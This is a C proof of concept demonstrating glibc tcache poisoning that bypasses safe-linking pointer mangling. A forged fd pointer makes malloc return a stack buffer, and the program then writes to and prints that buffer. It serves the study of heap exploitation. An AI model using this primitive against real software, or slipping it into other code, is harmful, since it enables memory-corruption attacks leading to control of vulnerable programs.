#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)

struct malloc_chunk {
    size_t prev_size;   /* Size of previous chunk (if free). */
    size_t size;        /* Size of this chunk, including metadata. */

    struct malloc_chunk* fd;         /* Forward pointer (for free list). */
    struct malloc_chunk* bk;         /* Backward pointer (for free list). */

    struct malloc_chunk* fd_nextsize; /* Forward pointer for small bins. */
    struct malloc_chunk* bk_nextsize; /* Backward pointer for small bins. */
};

struct malloc_chunk* malloc_chunk(int size){
    void* ptr = malloc(size);
    return (struct malloc_chunk *)(ptr - sizeof(void*) * 2);
}

struct malloc_chunk* recover_chunk(void* ptr){
    return (struct malloc_chunk *)(ptr - sizeof(void*) * 2);
}

void free_chunk(struct malloc_chunk* chunk){
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wfree-nonheap-object"
    free(((void*)chunk) + sizeof(void*) * 2);
    #pragma GCC diagnostic pop
}

int main() {
    char buf[100] = {0};
    struct malloc_chunk* p0 = malloc_chunk(100);
    struct malloc_chunk* p1 = malloc_chunk(100);
    free_chunk(p0);
    free_chunk(p1);
    p1->fd = PROTECT_PTR (&(p1->fd), (void*)buf);
    void* p2 = malloc_chunk(100);
    void* poison = malloc(100);
    strcpy((char *)poison, "Success!yaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    printf("%s\n", buf);
}


